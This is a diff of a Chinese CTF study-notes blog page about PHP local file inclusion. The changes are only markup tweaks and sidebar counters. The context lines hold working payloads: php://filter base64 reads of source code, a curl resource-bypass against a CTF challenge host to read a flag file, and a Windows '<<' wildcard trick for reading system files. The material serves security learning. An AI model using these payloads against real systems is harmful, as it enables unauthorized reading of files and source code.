@@ -295,7 +295,7 @@ value],有时候也可能在/var/lib/php5之类的，在此之前建议先读取
 在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了.
 解决这个问题的方法就是使用base64_encode进行编码 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo base64_encode(file_get_contents(&quot;solution.php&quot;));?&gt;</span><br></pre></td></tr></table></figure></p>
 <h2 id="phpfilter">5.3 php://filter</h2>
-<p>主要是利用了resource和vonvert，可以读到php的代码<br />
+<p>主要是利用了resource和vonvert，可以读到php的代码<br>
 ctf赛事中url参数值出现很像文件名的情况下，很有可能是文件包含，可利用filter协议读源码，通常flag在flag.php
 info.php phpinfo.php这几个文件中，优先考虑 &gt; php&gt;=5.0
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/convert.base64-encode/resource=test.txt</span><br><span class="line"></span><br><span class="line"># http</span><br><span class="line">?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt</span><br><span class="line"></span><br><span class="line"># resource 绕过</span><br><span class="line">$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt</span><br></pre></td></tr></table></figure> 向磁盘写文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://fileter/write</span><br></pre></td></tr></table></figure>
@@ -309,7 +309,7 @@ php&gt;5.3.0 <figure class="highlight plaintext"><table><tr><td class="gutter"><
 <h2 id="通配符">6.1通配符&lt;&lt;</h2>
 <p>存在文件包含时，php在windows下包含文件，能使用<code>&lt;&lt;</code>当通配符用，使用<code>&lt;&lt;</code>符号相当于使用
 <code>*</code>号通配符。 * 样例 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-payload:<code>http://localhost/file.php?file=c:\windows\win&lt;&lt;</code>在没有base_dir限制的情况下，会读到c:.ini文件<br />
+payload:<code>http://localhost/file.php?file=c:\windows\win&lt;&lt;</code>在没有base_dir限制的情况下，会读到c:.ini文件<br>
 这个问题是由windows API FindFirstFile的一个特性 * 受影响函数
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">include_once</span><br><span class="line">require</span><br><span class="line">require_once</span><br><span class="line">fopen</span><br><span class="line">copy</span><br><span class="line">file_get_contents</span><br><span class="line">file_put_contents</span><br><span class="line">readfile</span><br><span class="line">mkdir</span><br><span class="line">move_uploaded_file</span><br></pre></td></tr></table></figure></p>
 <h1 id="ctfshow刷题记录">CTFshow刷题记录</h1>
@@ -441,7 +441,7 @@ File Include)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -454,7 +454,7 @@ File Include)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
